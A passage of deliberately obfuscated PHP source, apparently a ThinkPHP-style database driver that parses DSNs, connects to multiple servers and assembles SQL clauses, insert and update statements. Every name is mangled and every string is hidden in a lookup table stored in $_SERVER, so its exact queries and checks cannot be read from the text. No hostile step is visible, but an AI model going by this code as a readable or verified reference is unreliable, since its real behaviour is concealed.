$this->_getDsnType($úŞÅ½³[$à¯‚üĞ©[989]]); } } else { think_exception(think_lang($à¯‚üĞ©[1038]) . $à¯‚üĞ©[1039] . $ëÀõ¥˜Ç); } return $´‘Û¶ªˆ; } public function __call($üÎ³‚¾™, $éªß÷Ş’) { if (method_exists($this, $üÎ³‚¾™)) { return call_user_func_array(array($this, $üÎ³‚¾™), $éªß÷Ş’); } } protected function _getDsnType($å·Öõ¥Ó) { $½å™Ê ” = explode($_SERVER[Ò°Ì”İ•][4], $å·Öõ¥Ó); $òÇšŞ“ = strtoupper(trim($½å™Ê ”[0])); return $òÇšŞ“; } private function parseConfig($èşœÉ‰ë = '') { $Áî·ãé =& $_SERVER[Ò°Ì”İ•]; if (!empty($èşœÉ‰ë) && is_string($èşœÉ‰ë)) { $èşœÉ‰ë = $this->parseDSN($èşœÉ‰ë); } elseif (is_array($èşœÉ‰ë)) { $èşœÉ‰ë = array_change_key_case($èşœÉ‰ë); $èşœÉ‰ë = array($Áî·ãé[1034] => $èşœÉ‰ë[$Áî·ãé[1040]], $Áî·ãé[961] => $èşœÉ‰ë[$Áî·ãé[1041]], $Áî·ãé[962] => $èşœÉ‰ë[$Áî·ãé[1042]], $Áî·ãé[959] => $èşœÉ‰ë[$Áî·ãé[1043]], $Áî·ãé[960] => $èşœÉ‰ë[$Áî·ãé[1044]], $Áî·ãé[21] => $èşœÉ‰ë[$Áî·ãé[1045]], $Áî·ãé[989] => $èşœÉ‰ë[$Áî·ãé[1046]], $Áî·ãé[17] => isset($èşœÉ‰ë[$Áî·ãé[1047]]) ? $èşœÉ‰ë[$Áî·ãé[1047]] : array()); } elseif (empty($èşœÉ‰ë)) { if (think_config($Áî·ãé[1048]) && $Áî·ãé[1037] != strtolower(think_config($Áî·ãé[1049]))) { $èşœÉ‰ë = $this->parseDSN(think_config($Áî·ãé[1048])); } else { $èşœÉ‰ë = array($Áî·ãé[1034] => think_config($Áî·ãé[1049]), $Áî·ãé[961] => think_config($Áî·ãé[1050]), $Áî·ãé[962] => think_config($Áî·ãé[1051]), $Áî·ãé[959] => think_config($Áî·ãé[1052]), $Áî·ãé[960] => think_config($Áî·ãé[1053]), $Áî·ãé[21] => think_config($Áî·ãé[335]), $Áî·ãé[989] => think_config($Áî·ãé[1048]), $Áî·ãé[17] => think_config($Áî·ãé[1054])); } } return $èşœÉ‰ë; } protected function initConnect($Ôñ¶ÇÈ = true) { if (1 == think_config($_SERVER[Ò°Ì”İ•][22])) { $this->_linkID = $this->multiConnect($Ôñ¶ÇÈ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $—–ÆÑğ => $ÜÕ¨û‹) { $this->_linkID = $ÜÕ¨û‹; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ˆãû³¡ö = false) { $êâà•‰¬ =& $_SERVER[Ò°Ì”İ•]; static $•áÇæä£ = array(); static $Øñ³™ = -1; if (empty($•áÇæä£)) { foreach ($this->config as $™’†Õ­³ => $Ãİ¯ßõæ) { $•áÇæä£[$™’†Õ­³] = explode($êâà•‰¬[50], $Ãİ¯ßõæ); } } if (think_config($êâà•‰¬[1055])) { if ($ˆãû³¡ö || think_config($êâà•‰¬[483]) === !0) { $×µú“¢Ë = floor(mt_rand(0, think_config($êâà•‰¬[1056]) - 1)); $Øñ³™ = $×µú“¢Ë; } else { if (is_numeric(think_config($êâà•‰¬[1057]))) { $×µú“¢Ë = think_config($êâà•‰¬[1057]); } else { $×µú“¢Ë = floor(mt_rand(think_config($êâà•‰¬[1056]), count($•áÇæä£[$êâà•‰¬[959]]) - 1)); } } } else { $×µú“¢Ë = floor(mt_rand(0, count($•áÇæä£[$êâà•‰¬[959]]) - 1)); $Øñ³™ = $×µú“¢Ë; } $×µú“¢Ë = $Øñ³™ !== -1 ? $Øñ³™ : $×µú“¢Ë; $ğÎ¤ñùÜ = array($êâà•‰¬[961] => isset($•áÇæä£[$êâà•‰¬[961]][$×µú“¢Ë]) ? $•áÇæä£[$êâà•‰¬[961]][$×µú“¢Ë] : $•áÇæä£[$êâà•‰¬[961]][0], $êâà•‰¬[962] => isset($•áÇæä£[$êâà•‰¬[962]][$×µú“¢Ë]) ? $•áÇæä£[$êâà•‰¬[962]][$×µú“¢Ë] : $•áÇæä£[$êâà•‰¬[962]][0], $êâà•‰¬[959] => isset($•áÇæä£[$êâà•‰¬[959]][$×µú“¢Ë]) ? $•áÇæä£[$êâà•‰¬[959]][$×µú“¢Ë] : $•áÇæä£[$êâà•‰¬[959]][0], $êâà•‰¬[960] => isset($•áÇæä£[$êâà•‰¬[960]][$×µú“¢Ë]) ? $•áÇæä£[$êâà•‰¬[960]][$×µú“¢Ë] : $•áÇæä£[$êâà•‰¬[960]][0], $êâà•‰¬[21] => isset($•áÇæä£[$êâà•‰¬[21]][$×µú“¢Ë]) ? $•áÇæä£[$êâà•‰¬[21]][$×µú“¢Ë] : $•áÇæä£[$êâà•‰¬[21]][0], $êâà•‰¬[989] => isset($•áÇæä£[$êâà•‰¬[989]][$×µú“¢Ë]) ? $•áÇæä£[$êâà•‰¬[989]][$×µú“¢Ë] : $•áÇæä£[$êâà•‰¬[989]][0], $êâà•‰¬[17] => isset($•áÇæä£[$êâà•‰¬[17]][$×µú“¢Ë]) ? $•áÇæä£[$êâà•‰¬[17]][$×µú“¢Ë] : $•áÇæä£[$êâà•‰¬[17]][0]); return $this->connect($ğÎ¤ñùÜ, $×µú“¢Ë); } public function parseDSN($à‘ÖÛä) { $íŞ”ï›¼ =& $_SERVER[Ò°Ì”İ•]; if (empty($à‘ÖÛä)) { return !1; } $æ³Á´² = parse_url($à‘ÖÛä); if ($æ³Á´²[$íŞ”ï›¼[218]]) { $—Ê‹ƒ¨½ = array($íŞ”ï›¼[1034] => $æ³Á´²[$íŞ”ï›¼[218]], $íŞ”ï›¼[961] => isset($æ³Á´²[$íŞ”ï›¼[677]]) ? $æ³Á´²[$íŞ”ï›¼[677]] : $íŞ”ï›¼[12], $íŞ”ï›¼[962] => isset($æ³Á´²[$íŞ”ï›¼[1058]]) ? $æ³Á´²[$íŞ”ï›¼[1058]] : $íŞ”ï›¼[12], $íŞ”ï›¼[959] => isset($æ³Á´²[$íŞ”ï›¼[219]]) ? $æ³Á´²[$íŞ”ï›¼[219]] : $íŞ”ï›¼[12], $íŞ”ï›¼[960] => isset($æ³Á´²[$íŞ”ï›¼[220]]) ? $æ³Á´²[$íŞ”ï›¼[220]] : $íŞ”ï›¼[12], $íŞ”ï›¼[21] => isset($æ³Á´²[$íŞ”ï›¼[98]]) ? substr($æ³Á´²[$íŞ”ï›¼[98]], 1) : $íŞ”ï›¼[12]); } else { preg_match($íŞ”ï›¼[1059], trim($à‘ÖÛä), $ªÁ¼Æ—Á); $—Ê‹ƒ¨½ = array($íŞ”ï›¼[1034] => $ªÁ¼Æ—Á[1], $íŞ”ï›¼[961] => $ªÁ¼Æ—Á[2], $íŞ”ï›¼[962] => $ªÁ¼Æ—Á[3], $íŞ”ï›¼[959] => $ªÁ¼Æ—Á[4], $íŞ”ï›¼[960] => $ªÁ¼Æ—Á[5], $íŞ”ï›¼[21] => $ªÁ¼Æ—Á[6]); } $—Ê‹ƒ¨½[$íŞ”ï›¼[989]] = $íŞ”ï›¼[12]; return $—Ê‹ƒ¨½; } protected function debug() { $¢Çİî•Â =& $_SERVER[Ò°Ì”İ•]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¢Çİî•Â[1060]; if (think_config($¢Çİî•Â[1061])) { think_status($¢Çİî•Â[1062]); think_trace($this->queryStr . $¢Çİî•Â[1063] . think_status($¢Çİî•Â[24], $¢Çİî•Â[1062], 6) . $¢Çİî•Â[1064], $¢Çİî•Â[12], $¢Çİî•Â[1065]); } } protected function parseLock($ààí İ = false) { $Òµ‹ãåç =& $_SERVER[Ò°Ì”İ•]; if (!$ààí İ) { return $Òµ‹ãåç[12]; } if ($Òµ‹ãåç[991] == $this->dbType) { return $Òµ‹ãåç[1066]; } return $Òµ‹ãåç[1067]; } protected function parseSet($¸™Ğ²’Æ) { $åş“º Š =& $_SERVER[Ò°Ì”İ•]; foreach ($¸™Ğ²’Æ as $ÆÓ´ßÑá => $¯ì’£À›) { if (is_array($¯ì’£À›) && $åş“º Š[384] == $¯ì’£À›[0]) { $ºá˜µõ [] = $this->parseKey($ÆÓ´ßÑá) . $åş“º Š[518] . $¯ì’£À›[1]; } elseif (is_scalar($¯ì’£À›) || is_null($¯ì’£À›)) { $ºá˜µõ [] = $this->parseKey($ÆÓ´ßÑá) . $åş“º Š[518] . $this->parseValue($¯ì’£À›); } } return $åş“º Š[1068] . implode($åş“º Š[50], $ºá˜µõ ); } protected function bindParam($™êÚµÑ, $»¹şöÚ™) { $this->bind[$_SERVER[Ò°Ì”İ•][4] . $™êÚµÑ] = $»¹şöÚ™; } protected function parseBind($Œäğ¦¶) { $Œäğ¦¶ = array_merge($this->bind, $Œäğ¦¶); $this->bind = array(); return $Œäğ¦¶; } function parseKey(&$Õœü˜í, $òêÎŞîş = true) { if ($òêÎŞîş) { $Õœü˜í = $this->parseKeyCheck($Õœü˜í); } return $Õœü˜í; } function parseKeyCheck($Ş’µñ…) { $åÉÛÅ­Å =& $_SERVER[Ò°Ì”İ•]; $Ş’µñ… = trim($Ş’µñ…); if (!preg_match($åÉÛÅ­Å[1069], $Ş’µñ…)) { think_exception($åÉÛÅ­Å[1070] . $Ş’µñ…); } return $Ş’µñ…; } protected function parseValue($§¦»ëöŒ) { $×äé’Úª =& $_SERVER[Ò°Ì”İ•]; if (is_string($§¦»ëöŒ)) { $§¦»ëöŒ = $×äé’Úª[1030] . $this->escapeString($§¦»ëöŒ) . $×äé’Úª[1030]; } elseif (isset($§¦»ëöŒ[0]) && is_string($§¦»ëöŒ[0]) && strtolower($§¦»ëöŒ[0]) == $×äé’Úª[384]) { $§¦»ëöŒ = $this->escapeString($§¦»ëöŒ[1]); } elseif (is_array($§¦»ëöŒ)) { $§¦»ëöŒ = array_map(array($this, $×äé’Úª[1031]), $§¦»ëöŒ); } elseif (is_bool($§¦»ëöŒ)) { $§¦»ëöŒ = $§¦»ëöŒ ? $×äé’Úª[102] : $×äé’Úª[241]; } elseif (is_null($§¦»ëöŒ)) { $§¦»ëöŒ = $×äé’Úª[117]; } return $§¦»ëöŒ; } protected function parseField($ö„™¹‰¶) { $šœ—êÈˆ =& $_SERVER[Ò°Ì”İ•]; if (is_string($ö„™¹‰¶) && strpos($ö„™¹‰¶, $šœ—êÈˆ[50])) { $ö„™¹‰¶ = explode($šœ—êÈˆ[50], $ö„™¹‰¶); } if (is_array($ö„™¹‰¶)) { $”·´ñæ = array(); foreach ($ö„™¹‰¶ as $Å­–”„ => $üÜ©Ìˆ) { if (!is_numeric($Å­–”„)) { $”·´ñæ[] = $this->parseKey($Å­–”„, !1) . $šœ—êÈˆ[1071] . $this->parseKey($üÜ©Ìˆ); } else { $”·´ñæ[] = $this->parseKey($üÜ©Ìˆ); } } $‘ïê¶û‰ = implode($šœ—êÈˆ[50], $”·´ñæ); } elseif (is_string($ö„™¹‰¶) && !empty($ö„™¹‰¶)) { $‘ïê¶û‰ = $ö„™¹‰¶; } else { $‘ïê¶û‰ = $šœ—êÈˆ[233]; } return $‘ïê¶û‰; } protected function parseTable($İÍĞ”Ãã) { $ÅÍâÀ =& $_SERVER[Ò°Ì”İ•]; if (is_array($İÍĞ”Ãã)) { $¾çÙé·À = array(); foreach ($İÍĞ”Ãã as $ÌØ×şÜÚ => $šË¦ö¯¶) { if (!is_numeric($ÌØ×şÜÚ)) { $¾çÙé·À[] = $this->parseKey($ÌØ×şÜÚ) . $ÅÍâÀ[53] . $this->parseKey($šË¦ö¯¶); } else { $¾çÙé·À[] = $this->parseKey($ÌØ×şÜÚ); } } $İÍĞ”Ãã = $¾çÙé·À; } elseif (is_string($İÍĞ”Ãã)) { if (strstr($İÍĞ”Ãã, $ÅÍâÀ[53])) { return $İÍĞ”Ãã; } $İÍĞ”Ãã = explode($ÅÍâÀ[50], $İÍĞ”Ãã); array_walk($İÍĞ”Ãã, array($this, $ÅÍâÀ[979])); } return $ÅÍâÀ[973] . trim(implode($ÅÍâÀ[1072], $İÍĞ”Ãã), $ÅÍâÀ[473]) . $ÅÍâÀ[973]; } protected function parseWhere($ı‚éŒ) { $ù»‡Ïß =& $_SERVER[Ò°Ì”İ•]; $»É¹òÌŸ = $ù»‡Ïß[12]; if (is_string($ı‚éŒ)) { $»É¹òÌŸ = $ı‚éŒ; } else { $–œÌšù¿ = isset($ı‚éŒ[$ù»‡Ïß[1073]]) ? strtoupper($ı‚éŒ[$ù»‡Ïß[1073]]) : $ù»‡Ïß[12]; if (in_array($–œÌšù¿, array($ù»‡Ïß[1074], $ù»‡Ïß[1075], $ù»‡Ïß[1076]))) { $–œÌšù¿ = $ù»‡Ïß[53] . $–œÌšù¿ . $ù»‡Ïß[53]; unset($ı‚éŒ[$ù»‡Ïß[1073]]); } else { $–œÌšù¿ = $ù»‡Ïß[1077]; } foreach ($ı‚éŒ as $€ÎÅû‹” => $õú„Åß¡) { $»É¹òÌŸ .= $ù»‡Ïß[366]; if (is_numeric($€ÎÅû‹”)) { $€ÎÅû‹” = $ù»‡Ïß[1078]; } if (0 === strpos($€ÎÅû‹”, $ù»‡Ïß[11])) { $»É¹òÌŸ .= $this->parseThinkWhere($€ÎÅû‹”, $õú„Åß¡); } else { if (!preg_match($ù»‡Ïß[1079], trim($€ÎÅû‹”))) { think_exception(think_lang($ù»‡Ïß[1080]) . $ù»‡Ïß[4] . $€ÎÅû‹”); } $ÙÇİ ×Ã = is_array($õú„Åß¡) && isset($õú„Åß¡[$ù»‡Ïß[1081]]); $€ÎÅû‹” = trim($€ÎÅû‹”); if (strpos($€ÎÅû‹”, $ù»‡Ïß[225])) { $ëÓ˜©Éš = explode($ù»‡Ïß[225], $€ÎÅû‹”); $Ô·Ÿç = array(); foreach ($ëÓ˜©Éš as $šæÚ÷ ‡ => $‰ã÷ù) { $÷‰‚Ü³º = $ÙÇİ ×Ã ? $õú„Åß¡[$šæÚ÷ ‡] : $õú„Åß¡; $Ô·Ÿç[] = $ù»‡Ïß[349] . $this->parseWhereItem($this->parseKey($‰ã÷ù), $÷‰‚Ü³º) . $ù»‡Ïß[978]; } $»É¹òÌŸ .= implode($ù»‡Ïß[1082], $Ô·Ÿç); } elseif (strpos($€ÎÅû‹”, $ù»‡Ïß[297])) { $ëÓ˜©Éš = explode($ù»‡Ïß[297], $€ÎÅû‹”); $Ô·Ÿç = array(); foreach ($ëÓ˜©Éš as $šæÚ÷ ‡ => $‰ã÷ù) { $÷‰‚Ü³º = $ÙÇİ ×Ã ? $õú„Åß¡[$šæÚ÷ ‡] : $õú„Åß¡; $Ô·Ÿç[] = $ù»‡Ïß[349] . $this->parseWhereItem($this->parseKey($‰ã÷ù), $÷‰‚Ü³º) . $ù»‡Ïß[978]; } $»É¹òÌŸ .= implode($ù»‡Ïß[1077], $Ô·Ÿç); } else { $»É¹òÌŸ .= $this->parseWhereItem($this->parseKey($€ÎÅû‹”), $õú„Åß¡); } } $»É¹òÌŸ .= $ù»‡Ïß[367] . $–œÌšù¿; } $»É¹òÌŸ = substr($»É¹òÌŸ, 0, -strlen($–œÌšù¿)); } return empty($»É¹òÌŸ) ? $ù»‡Ïß[12] : $ù»‡Ïß[1083] . $»É¹òÌŸ; } protected function parseWhereItem($©âø„‡ø, $áß„¢Ğß) { $”á½Ã =& $_SERVER[Ò°Ì”İ•]; $ÃÌßÎŒÔ = $”á½Ã[12]; if (is_array($áß„¢Ğß)) { if (is_string($áß„¢Ğß[0])) { $¾¦ÛãÍ‡ = strtolower($áß„¢Ğß[0]); if (in_array($áß„¢Ğß[0], array($”á½Ã[518], $”á½Ã[1084], $”á½Ã[1085], $”á½Ã[1086], $”á½Ã[1087], $”á½Ã[1088]))) { $ÃÌßÎŒÔ .= $©âø„‡ø . $”á½Ã[53] . $áß„¢Ğß[0] . $”á½Ã[53] . $this->parseValue($áß„¢Ğß[1]); } elseif (preg_match($”á½Ã[1089], $áß„¢Ğß[0])) { $ÃÌßÎŒÔ .= $©âø„‡ø . $”á½Ã[53] . $this->exp[$¾¦ÛãÍ‡] . $”á½Ã[53] . $this->parseValue($áß„¢Ğß[1]); } elseif (preg_match($”á½Ã[1090], $áß„¢Ğß[0])) { if (is_array($áß„¢Ğß[1])) { $¯¯¼ÓŒî = isset($áß„¢Ğß[2]) ? strtoupper($áß„¢Ğß[2]) : $”á½Ã[1075]; if (in_array($¯¯¼ÓŒî, array($”á½Ã[1074], $”á½Ã[1075], $”á½Ã[1076]))) { $éÑã°ÊÉ = array(); foreach ($áß„¢Ğß[1] as $îÜÙŸ) { $éÑã°ÊÉ[] = $©âø„‡ø . $”á½Ã[53] . $this->exp[$¾¦ÛãÍ‡] . $”á½Ã[53] . $this->parseValue($îÜÙŸ); } $ÃÌßÎŒÔ .= $”á½Ã[349] . implode($”á½Ã[53] . $¯¯¼ÓŒî . $”á½Ã[53], $éÑã°ÊÉ) . $”á½Ã[978]; } } else { $ÃÌßÎŒÔ .= $©âø„‡ø . $”á½Ã[53] . $this->exp[$¾¦ÛãÍ‡] . $”á½Ã[53] . $this->parseValue($áß„¢Ğß[1]); } } elseif ($”á½Ã[384] == $¾¦ÛãÍ‡) { $ÃÌßÎŒÔ .= $”á½Ã[976] . $©âø„‡ø . $”á½Ã[53] . $áß„¢Ğß[1] . $”á½Ã[1091]; } elseif (preg_match($”á½Ã[1092], $áß„¢Ğß[0])) { $ÃÌßÎŒÔ .= $áß„¢Ğß[0]; } elseif (preg_match($”á½Ã[1093], $áß„¢Ğß[0])) { if (isset($áß„¢Ğß[2]) && $”á½Ã[384] == $áß„¢Ğß[2]) { $ÃÌßÎŒÔ .= $©âø„‡ø . $”á½Ã[53] . $this->exp[$¾¦ÛãÍ‡] . $”á½Ã[53] . $áß„¢Ğß[1]; } else { if (is_string($áß„¢Ğß[1])) { $áß„¢Ğß[1] = explode($”á½Ã[50], $áß„¢Ğß[1]); } $ÇÖù„ÍŒ = implode($”á½Ã[50], $this->parseValue($áß„¢Ğß[1])); $ÃÌßÎŒÔ .= $©âø„‡ø . $”á½Ã[53] . $this->exp[$¾¦ÛãÍ‡] . $”á½Ã[976] . $ÇÖù„ÍŒ . $”á½Ã[978]; } } elseif (preg_match($”á½Ã[1094], $áß„¢Ğß[0])) { $ÈİŒãı = is_string($áß„¢Ğß[1]) ? explode($”á½Ã[50], $áß„¢Ğß[1]) : $áß„¢Ğß[1]; $ÃÌßÎŒÔ .= $”á½Ã[976] . $©âø„‡ø . $”á½Ã[53] . $this->exp[$¾¦ÛãÍ‡] . $”á½Ã[53] . $this->parseValue($ÈİŒãı[0]) . $”á½Ã[1077] . $this->parseValue($ÈİŒãı[1]) . $”á½Ã[367]; } else { think_exception(think_lang($”á½Ã[1080]) . $”á½Ã[4] . $áß„¢Ğß[0]); } } else { $Æ²ŸŒİ = count($áß„¢Ğß); $š‚ÇºŸ = $”á½Ã[12]; if (is_string($áß„¢Ğß[$Æ²ŸŒİ - 1])) { $š‚ÇºŸ = isset($áß„¢Ğß[$Æ²ŸŒİ - 1]) ? strtoupper($áß„¢Ğß[$Æ²ŸŒİ - 1]) : $”á½Ã[12]; if (in_array($š‚ÇºŸ, array($”á½Ã[1074], $”á½Ã[1075], $”á½Ã[1076]))) { $Æ²ŸŒİ = $Æ²ŸŒİ - 1; } } else { $š‚ÇºŸ = $”á½Ã[1074]; } for ($¯™çÈû = 0; $¯™çÈû < $Æ²ŸŒİ; $¯™çÈû++) { $ÈİŒãı = is_array($áß„¢Ğß[$¯™çÈû]) ? $áß„¢Ğß[$¯™çÈû][1] : $áß„¢Ğß[$¯™çÈû]; if ($”á½Ã[384] == strtolower($áß„¢Ğß[$¯™çÈû][0])) { $ÃÌßÎŒÔ .= $”á½Ã[349] . $©âø„‡ø . $”á½Ã[53] . $ÈİŒãı . $”á½Ã[1091] . $š‚ÇºŸ . $”á½Ã[53]; } else { $„¦‰ÛÁ = is_array($áß„¢Ğß[$¯™çÈû]) ? $this->exp[strtolower($áß„¢Ğß[$¯™çÈû][0])] : $”á½Ã[518]; if (!$„¦‰ÛÁ && is_array($áß„¢Ğß[$¯™çÈû]) && in_array($áß„¢Ğß[$¯™çÈû][0], array($”á½Ã[518], $”á½Ã[1084], $”á½Ã[1085], $”á½Ã[1086], $”á½Ã[1087], $”á½Ã[1088]))) { $„¦‰ÛÁ = $áß„¢Ğß[$¯™çÈû][0]; } $ÃÌßÎŒÔ .= $”á½Ã[349] . $©âø„‡ø . $”á½Ã[53] . $„¦‰ÛÁ . $”á½Ã[53] . $this->parseValue($ÈİŒãı) . $”á½Ã[1091] . $š‚ÇºŸ . $”á½Ã[53]; } } $ÃÌßÎŒÔ = substr($ÃÌßÎŒÔ, 0, -4); } } else { $ÃÌßÎŒÔ .= $©âø„‡ø . $”á½Ã[1095] . $this->parseValue($áß„¢Ğß); } return $ÃÌßÎŒÔ; } protected function parseThinkWhere($ÆÚõæ÷, $¶ƒ«å÷±) { $¨‹†¡ú÷ =& $_SERVER[Ò°Ì”İ•]; $»Ğ‡æ¯Ù = $¨‹†¡ú÷[12]; switch ($ÆÚõæ÷) { case $¨‹†¡ú÷[439]: $»Ğ‡æ¯Ù = $¶ƒ«å÷±; break; case $¨‹†¡ú÷[1078]: $»Ğ‡æ¯Ù = is_string($¶ƒ«å÷±) ? $¶ƒ«å÷± : substr($this->parseWhere($¶ƒ«å÷±), 6); break; case $¨‹†¡ú÷[1096]: parse_str($¶ƒ«å÷±, $ÏüÒ±ÇÈ); if (isset($ÏüÒ±ÇÈ[$¨‹†¡ú÷[1073]])) { $ÜıØèà” = $¨‹†¡ú÷[53] . strtoupper($ÏüÒ±ÇÈ[$¨‹†¡ú÷[1073]]) . $¨‹†¡ú÷[53]; unset($ÏüÒ±ÇÈ[$¨‹†¡ú÷[1073]]); } else { $ÜıØèà” = $¨‹†¡ú÷[1077]; } $ÓĞ¬±²‹ = array(); foreach ($ÏüÒ±ÇÈ as $‹…›¼‚½ => $Ò•ò«êï) { $ÓĞ¬±²‹[] = $this->parseKey($‹…›¼‚½) . $¨‹†¡ú÷[1095] . $this->parseValue($Ò•ò«êï); } $»Ğ‡æ¯Ù = implode($ÜıØèà”, $ÓĞ¬±²‹); break; } return $»Ğ‡æ¯Ù; } protected function parseLimit($æĞå·öù) { $£ÚÌƒ =& $_SERVER[Ò°Ì”İ•]; return !empty($æĞå·öù) ? $£ÚÌƒ[51] . $æĞå·öù . $£ÚÌƒ[53] : $£ÚÌƒ[12]; } protected function parseJoin($Üëòùª) { $…ÀÆ…Úé =& $_SERVER[Ò°Ì”İ•]; $Ğ„‘ä½Ë = $…ÀÆ…Úé[12]; if (!empty($Üëòùª)) { if (is_array($Üëòùª)) { foreach ($Üëòùª as $ÒÛš‚“æ => $ŸÈ¿ìâ ) { if (!1 !== stripos($ŸÈ¿ìâ , $…ÀÆ…Úé[1097])) { $Ğ„‘ä½Ë .= $…ÀÆ…Úé[53] . $ŸÈ¿ìâ ; } else { $Ğ„‘ä½Ë .= $…ÀÆ…Úé[1098] . $ŸÈ¿ìâ ; } } } else { $Ğ„‘ä½Ë .= $…ÀÆ…Úé[1098] . $Üëòùª; } } $Ğ„‘ä½Ë = preg_replace($…ÀÆ…Úé[1099], think_config($…ÀÆ…Úé[1003]) . $…ÀÆ…Úé[1100], $Ğ„‘ä½Ë); return $Ğ„‘ä½Ë; } protected function parseOrder($ÇãŸæïƒ) { $åì¨çûü =& $_SERVER[Ò°Ì”İ•]; if (is_array($ÇãŸæïƒ)) { $İë¦äŠ = array(); foreach ($ÇãŸæïƒ as $ÛÉşÓ¤§ => $ûó±ç¦Â) { if (is_numeric($ÛÉşÓ¤§)) { $İë¦äŠ[] = $this->parseKey($ûó±ç¦Â); } else { $ûó±ç¦Â = in_array(strtoupper(trim($ûó±ç¦Â)), array($åì¨çûü[1101], $åì¨çûü[1102])) ? $åì¨çûü[53] . $ûó±ç¦Â : $åì¨çûü[12]; if (preg_match($åì¨çûü[1103], $ÛÉşÓ¤§)) { $İë¦äŠ[] = $this->parseKey($ÛÉşÓ¤§) . $ûó±ç¦Â; } else { think_exception($åì¨çûü[1104] . $ÛÉşÓ¤§); } } } $ÇãŸæïƒ = implode($åì¨çûü[50], $İë¦äŠ); } return !empty($ÇãŸæïƒ) ? $åì¨çûü[1105] . $ÇãŸæïƒ : $åì¨çûü[12]; } protected function parseGroup($«öï­„) { $ÆÈ¿„‹¼ =& $_SERVER[Ò°Ì”İ•]; return !empty($«öï­„) ? $ÆÈ¿„‹¼[1106] . $«öï­„ : $ÆÈ¿„‹¼[12]; } protected function parseHaving($ İúÏÄ) { $ÅÈô™‚Í =& $_SERVER[Ò°Ì”İ•]; return !empty($ İúÏÄ) ? $ÅÈô™‚Í[1107] . $ İúÏÄ : $ÅÈô™‚Í[12]; } protected function parseComment($¡ÆúÃŠë) { $ßÓÔÓÖ =& $_SERVER[Ò°Ì”İ•]; return !empty($¡ÆúÃŠë) ? $ßÓÔÓÖ[1108] . $¡ÆúÃŠë . $ßÓÔÓÖ[1109] : $ßÓÔÓÖ[12]; } protected function parseDistinct($Ì ô¬è) { $Ç²šßÌ =& $_SERVER[Ò°Ì”İ•]; return !empty($Ì ô¬è) ? $Ç²šßÌ[1110] : $Ç²šßÌ[12]; } protected function parseUnion($ËÊ§ú¥¿) { $ëí•ïâé =& $_SERVER[Ò°Ì”İ•]; if (empty($ËÊ§ú¥¿)) { return $ëí•ïâé[12]; } if (isset($ËÊ§ú¥¿[$ëí•ïâé[435]])) { $×Í©˜•« = $ëí•ïâé[1111]; unset($ËÊ§ú¥¿[$ëí•ïâé[435]]); } else { $×Í©˜•« = $ëí•ïâé[1112]; } foreach ($ËÊ§ú¥¿ as $÷™÷®Ã±) { $£˜ªùö[] = $×Í©˜•« . (is_array($÷™÷®Ã±) ? $this->buildSelectSql($÷™÷®Ã±) : $÷™÷®Ã±); } return implode($ëí•ïâé[53], $£˜ªùö); } public function insert($—èèû˜Í, $ï€æ¼ã¯ = array(), $ÍÖ»ÈÉ¦ = false) { $‹ÔâÌ¿Ì =& $_SERVER[Ò°Ì”İ•]; $„Ÿİèõ” = $Æ˜ıƒƒ‹ = array(); $this->model = $ï€æ¼ã¯[$‹ÔâÌ¿Ì[370]]; foreach ($—èèû˜Í as $¹ú§‚öá => $Õí¼¥¨) { if (is_array($Õí¼¥¨) && $‹ÔâÌ¿Ì[384] == $Õí¼¥¨[0]) { $Æ˜ıƒƒ‹[] = $this->parseKey($¹ú§‚öá); $„Ÿİèõ”[] = $Õí¼¥¨[1]; } elseif (is_scalar($Õí¼¥¨) || is_null($Õí¼¥¨)) { $Æ˜ıƒƒ‹[] = $this->parseKey($¹ú§‚öá); $„Ÿİèõ”[] = $this->parseValue($Õí¼¥¨); } } $ææÓÊßİ = ($ÍÖ»ÈÉ¦ ? $‹ÔâÌ¿Ì[980] : $‹ÔâÌ¿Ì[981]) . $‹ÔâÌ¿Ì[982] . $this->parseTable($ï€æ¼ã¯[$‹ÔâÌ¿Ì[368]]) . $‹ÔâÌ¿Ì[976] . implode($‹ÔâÌ¿Ì[50], $Æ˜ıƒƒ‹) . $‹ÔâÌ¿Ì[977] . implode($‹ÔâÌ¿Ì[50], $„Ÿİèõ”) . $‹ÔâÌ¿Ì[978]; $ææÓÊßİ .= $this->parseLock(isset($ï€æ¼ã¯[$‹ÔâÌ¿Ì[917]]) ? $ï€æ¼ã¯[$‹ÔâÌ¿Ì[917]] : !1); $ææÓÊßİ .= $this->parseComment(!empty($ï€æ¼ã¯[$‹ÔâÌ¿Ì[441]]) ? $ï€æ¼ã¯[$‹ÔâÌ¿Ì[441]] : $‹ÔâÌ¿Ì[12]); return $this->execute($ææÓÊßİ, $this->parseBind(!empty($ï€æ¼ã¯[$‹ÔâÌ¿Ì[372]]) ? $ï€æ¼ã¯[$‹ÔâÌ¿Ì[372]] : array())); } public function selectInsert($‹¼°€Ñ², $æİì®Ç³, $¹ãÖ½Ñ­ = array()) { $´¼Œ÷ñ¡ =& $_SERVER[Ò°Ì”İ•]; $this->model = $¹ãÖ½Ñ­[$´¼Œ÷ñ¡[370]]; if (is_string($‹¼°€Ñ²)) { $‹¼°€Ñ² = explode($´¼Œ÷ñ¡[50], $‹¼°€Ñ²); } array_walk($‹¼°€Ñ², array($this, $´¼Œ÷ñ¡[979])); $‚½”Ë‘ = $´¼Œ÷ñ¡[1113] . $this->parseTable($æİì®Ç³) . $´¼Œ÷ñ¡[976] . implode($´¼Œ÷ñ¡[50], $‹¼°€Ñ²) . $´¼Œ÷ñ¡[1091]; $‚½”Ë‘ .= $this->buildSelectSql($¹ãÖ½Ñ­); return $this->execute($‚½”Ë‘, $this->parseBind(!empty($¹ãÖ½Ñ­[$´¼Œ÷ñ¡[372]]) ? $¹ãÖ½Ñ­[$´¼Œ÷ñ¡[372]] : array())); } public function update($´Ê¬¬Ñ§, $ú©Ëø­É) { $Õ—ÀÄ°î =& $_SERVER[Ò°Ì”İ•]; $this->model = $ú©Ëø­É[$Õ—ÀÄ°î[370]]; $‹€Ó¢àœ = $Õ—ÀÄ°î[1114] . $this->parseTable($ú©Ëø­É[$Õ—ÀÄ°î[368]]) . $this->parseSet($´Ê¬¬Ñ§) . $this->parseWhere(!empty($ú©Ëø­É[$Õ—ÀÄ°î[364]]) ? 